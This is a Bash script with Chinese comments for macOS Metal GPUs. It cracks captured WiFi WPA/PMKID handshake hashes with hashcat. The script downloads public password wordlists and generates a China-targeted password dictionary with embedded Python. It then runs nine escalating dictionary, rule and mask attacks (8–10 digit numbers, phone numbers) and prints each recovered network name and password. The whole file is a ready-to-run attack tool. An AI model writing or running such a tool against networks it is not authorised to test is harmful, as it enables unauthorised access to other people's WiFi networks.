#!/usr/bin/env bash
# ============================================================================
# WiFi握手包本地GPU破解 - macOS M1/M2/M3/M4 Metal加速
# 用法:
#   bash crack-local.sh handshake.22000        # 指定文件
#   bash crack-local.sh                        # 交互式粘贴hashline
# ============================================================================
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORK_DIR="$SCRIPT_DIR"
DICT_DIR="$WORK_DIR/dicts"
POTFILE="$WORK_DIR/hashcat.potfile"
OUTFILE="$WORK_DIR/cracked.txt"
HASHCAT_BIN="$(which hashcat 2>/dev/null || echo hashcat)"

mkdir -p "$DICT_DIR"

# ── 颜色 ──
G='\033[0;32m' Y='\033[1;33m' C='\033[0;36m' R='\033[0;31m' N='\033[0m'

echo ""
echo "============================================================"
echo "  WiFi握手包本地GPU破解 - macOS Metal"
echo "  hashcat: $($HASHCAT_BIN --version 2>/dev/null)"
echo "============================================================"

# ── 加载握手包 ──
HASH_FILE="$WORK_DIR/hashes.22000"

if [ -n "$1" ] && [ -f "$1" ]; then
    cp "$1" "$HASH_FILE"
    echo -e "${G}[+]${N} 从文件加载: $1"
elif [ -f "$HASH_FILE" ]; then
    echo -e "${G}[+]${N} 使用已有: $HASH_FILE"
else
    echo ""
    echo -e "${Y}[!]${N} 未找到握手包，请选择:"
    echo "  1) 粘贴hashline（粘贴后按Ctrl+D）"
    echo "  2) 输入.22000文件路径"
    read -p "  选择 [1/2]: " ch
    case "$ch" in
        1) echo "  粘贴hashline后按Ctrl+D:"; cat > "$HASH_FILE"
           grep '^WPA\*' "$HASH_FILE" > "${HASH_FILE}.tmp" && mv "${HASH_FILE}.tmp" "$HASH_FILE" ;;
        2) read -p "  路径: " fp; [ -f "$fp" ] && cp "$fp" "$HASH_FILE" || { echo -e "${R}[x] 文件不存在${N}"; exit 1; } ;;
        *) exit 0 ;;
    esac
fi

HC=$(grep -c '^WPA\*' "$HASH_FILE" 2>/dev/null || echo 0)
[ "$HC" -eq 0 ] && echo -e "${R}[x] 无有效hashline${N}" && exit 1
echo -e "${G}[+]${N} 加载 $HC 个握手包"

# ── 显示目标 ──
echo ""
while IFS= read -r line; do
    [[ "$line" != WPA* ]] && continue
    IFS='*' read -ra P <<< "$line"
    [ "${#P[@]}" -lt 6 ] && continue
    T="EAPoL"; [ "${P[1]}" = "01" ] && T="PMKID"
    S=$(echo "${P[5]}" | xxd -r -p 2>/dev/null || echo "${P[5]}")
    M="${P[3]}"; B="${M:0:2}:${M:2:2}:${M:4:2}:${M:6:2}:${M:8:2}:${M:10:2}"
    printf "  %-24s  %-19s  %s\n" "$S" "$B" "$T"
done < "$HASH_FILE"

# ── 下载字典 ──
echo ""
echo "============================================================"
echo "  字典准备"
echo "============================================================"

dl() {
    local url="$1" path="$2" desc="$3"
    [ -f "$path" ] && [ "$(wc -c < "$path")" -gt 100 ] && { echo -e "${G}[+]${N} $desc: $(wc -l < "$path") 条"; return; }
    echo -e "${C}[*]${N} 下载 $desc..."
    if [[ "$url" == *.gz ]]; then
        curl -sL "$url" -o "${path}.gz" && gunzip -f "${path}.gz" 2>/dev/null
    else
        curl -sL "$url" -o "$path"
    fi
    [ -f "$path" ] && echo -e "${G}[+]${N} $desc: $(wc -l < "$path") 条" || echo -e "${Y}[!]${N} $desc: 失败"
}

D1="$DICT_DIR/wpa-sec.txt"
dl "https://wpa-sec.stanev.org/dict/cracked.txt.gz" "$D1" "wpa-sec全球已破解(~75万)"

D2="$DICT_DIR/probable-wpa.txt"
dl "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top204Thousand-WPA-probable-v2.txt" "$D2" "Probable WPA(~20万)"

D3="$DICT_DIR/seclists-10k.txt"
dl "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" "$D3" "SecLists Top10K"

# ── 中国定制字典 ──
D4="$DICT_DIR/china-wifi.txt"
if [ -f "$D4" ] && [ "$(wc -c < "$D4")" -gt 1000 ]; then
    echo -e "${G}[+]${N} 中国定制字典: $(wc -l < "$D4") 条"
else
    echo -e "${C}[*]${N} 生成中国定制字典..."
    python3 -c "
seen=set()
c=0
with open('$D4','w') as f:
    def a(s):
        global c
        if len(s)>=8 and s not in seen:
            seen.add(s);f.write(s+'\n');c+=1
    for d in '0123456789':
        a(d*8);a(d*9)
    for s in range(10):
        a(''.join(str((s+i)%10) for i in range(8)))
        a(''.join(str((s-i)%10) for i in range(8)))
    for a1 in range(10):
        for b in range(10):
            for c1 in range(10):
                for d in range(10):
                    a(f'{a1}{a1}{b}{b}{c1}{c1}{d}{d}')
    for n in range(10000):
        s=f'{n:04d}';a(s+s);a(s+s[::-1])
    for y in range(1960,2012):
        for m in range(1,13):
            for d in range(1,32):
                if m in(4,6,9,11)and d>30:continue
                if m==2 and d>29:continue
                a(f'{y:04d}{m:02d}{d:02d}');a(f'{m:02d}{d:02d}{y:04d}')
    for i in range(100000):
        a(f'520{i:05d}');a(f'{i:05d}520')
    for i in range(10000):
        a(f'1314{i:04d}');a(f'{i:04d}1314')
    for py in['woaini','nihao','mima','baobei','laogong','laopo','wechat','weixin','taobao','jiayou','xingfu']:
        for sx in['123','1234','12345','123456','12345678','888','666','520','1314','0000','9999']:
            a(py+sx);a(py.capitalize()+sx)
    for ch in'abcdefghijklmnopqrstuvwxyz':
        for nm in['1234567','12345678','123456789','11111111','88888888','00000000']:
            a(ch+nm);a(nm+ch)
    for c1 in'abcdefghijklmnopqrstuvwxyz':
        for c2 in'abcdefghijklmnopqrstuvwxyz':
            for nm in['123456','1234567','888888','666666']:
                a(c1+c2+nm)
    p4=['0000','1111','2222','3333','4444','5555','6666','7777','8888','9999','1234','5678','1314','0520']
    for p1 in p4:
        for p2 in p4:a(p1+p2)
        for n in range(10000):a(p1+f'{n:04d}')
    for p in['qwertyui','asdfghjk','1qaz2wsx','q1w2e3r4','qwer1234','admin1234','tplink1234','password1','huawei1234','wifi12345']:
        if len(p)>=8:a(p)
print(c)
" 2>/dev/null
    echo -e "${G}[+]${N} 中国定制字典: $(wc -l < "$D4") 条"
fi

# 本地大字典
D5="$SCRIPT_DIR/../wifi_dict.txt"
[ -f "$D5" ] && echo -e "${G}[+]${N} 本地大字典: $(wc -l < "$D5") 条"

# ── 9轮攻击 ──
echo ""
echo "============================================================"
echo "  9轮递进攻击 (M1 Metal ~52K H/s)"
echo "============================================================"

rm -f "$POTFILE" "$OUTFILE"
START=$(date +%s)
DONE=0

atk() {
    [ "$DONE" -eq 1 ] && return
    local name="$1"; shift
    echo ""
    echo -e "${C}──${N} $name"
    $HASHCAT_BIN -m 22000 "$HASH_FILE" --potfile-path "$POTFILE" --outfile "$OUTFILE" --outfile-format 2 -w 3 -O "$@" 2>&1 | grep -E "Speed|Recovered|Progress|Status" || true
    [ -f "$POTFILE" ] && [ "$(wc -l < "$POTFILE")" -ge "$HC" ] && DONE=1 && echo -e "${G}  >>> 全部破解! <<<${N}"
    [ -f "$POTFILE" ] && [ "$(wc -l < "$POTFILE")" -gt 0 ] && echo -e "${G}  已破解: $(wc -l < "$POTFILE")/$HC${N}"
}

[ -f "$D1" ] && atk "攻击1/9: wpa-sec全球字典" -a 0 "$D1"
[ -f "$D4" ] && atk "攻击2/9: 中国定制字典" -a 0 "$D4"

# 合并Probable+SecLists
if [ "$DONE" -eq 0 ]; then
    MG="$WORK_DIR/merged.txt"
    cat "$D2" "$D3" 2>/dev/null | sort -u > "$MG" 2>/dev/null
    [ -s "$MG" ] && atk "攻击3/9: Probable+SecLists" -a 0 "$MG"
fi

# 本地大字典
[ "$DONE" -eq 0 ] && [ -f "$D5" ] && atk "攻击3b: 本地大字典(wifi_dict.txt)" -a 0 "$D5"

# best64规则变异
if [ "$DONE" -eq 0 ]; then
    AM="$WORK_DIR/all.txt"
    cat "$D1" "$D4" "$D2" "$D3" 2>/dev/null | sort -u > "$AM" 2>/dev/null
    RULE="$(find /opt/homebrew /usr/local /usr/share -name best64.rule 2>/dev/null | head -1)"
    [ -n "$RULE" ] && [ -s "$AM" ] && atk "攻击4/9: 全字典+best64规则(×64倍)" -a 0 "$AM" -r "$RULE"
fi

atk "攻击5/9: 8位纯数字(1亿)" -a 3 '?d?d?d?d?d?d?d?d'

if [ "$DONE" -eq 0 ]; then
    MF="$WORK_DIR/prefix.hcmask"
    > "$MF"
    for c in a q z w s x e d c r f v t g b y h n u j m; do
        echo "${c}?d?d?d?d?d?d?d" >> "$MF"
    done
    atk "攻击6/9: 字母前缀+7位数字" -a 3 "$MF"
fi

atk "攻击7/9: 9位纯数字(10亿)" -a 3 '?d?d?d?d?d?d?d?d?d'
atk "攻击8/9: 手机号(1+10位)" -a 3 '1?d?d?d?d?d?d?d?d?d?d'
atk "攻击9/9: 10位纯数字(100亿)" -a 3 '?d?d?d?d?d?d?d?d?d?d'

# ── 结果 ──
EL=$(( $(date +%s) - START ))
echo ""
echo "============================================================"
echo "  破解结果"
echo "============================================================"

if [ -f "$POTFILE" ] && [ -s "$POTFILE" ]; then
    echo -e "${G}[+] 成功破解 $(wc -l < "$POTFILE")/$HC 个WiFi密码${N}"
    echo ""
    while IFS=: read -r hp pw; do
        IFS='*' read -ra H <<< "$hp"
        S=$(echo "${H[5]}" | xxd -r -p 2>/dev/null || echo "${H[5]}")
        echo -e "  ${G}$S${N}: ${Y}$pw${N}"
    done < "$POTFILE"
else
    echo -e "${Y}[!] 未破解任何密码${N}"
fi

echo ""
echo -e "${C}[*]${N} 总耗时: $((EL/60))分$((EL%60))秒"
echo ""
